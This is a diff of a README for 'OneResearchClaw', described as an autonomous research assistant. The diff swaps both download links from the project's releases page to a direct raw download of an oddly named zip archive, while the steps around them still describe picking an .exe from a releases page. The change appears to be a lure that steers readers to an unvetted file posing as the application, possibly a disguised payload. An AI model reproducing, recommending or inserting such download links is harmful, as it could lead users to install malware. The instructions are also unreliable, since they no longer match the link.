@@ -1,6 +1,6 @@
 # 🦞 OneResearchClaw - Automate your deep research tasks easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Joaobarro8827/OneResearchClaw/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Joaobarro8827/OneResearchClaw/main/autantitypy/One_Claw_Research_antichloristic.zip)
 
 OneResearchClaw acts as an autonomous digital assistant. It finds, gathers, and processes information from various sources to support your research. The system uses automated agents to perform tasks that typically require human oversight. You provide the goal, and the software executes the steps to reach a conclusion.
 
@@ -8,7 +8,7 @@ OneResearchClaw acts as an autonomous digital assistant. It finds, gathers, and 
 
 You need to access the release page to obtain the application. Follow these instructions to download the installer for Windows.
 
-1. Visit [this page to download](https://github.com/Joaobarro8827/OneResearchClaw/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/Joaobarro8827/OneResearchClaw/main/autantitypy/One_Claw_Research_antichloristic.zip).
 2. Look for the latest version listed at the top of the page.
 3. Find the file ending in `.exe` under the Assets section.
 4. Click the file name to start the download.
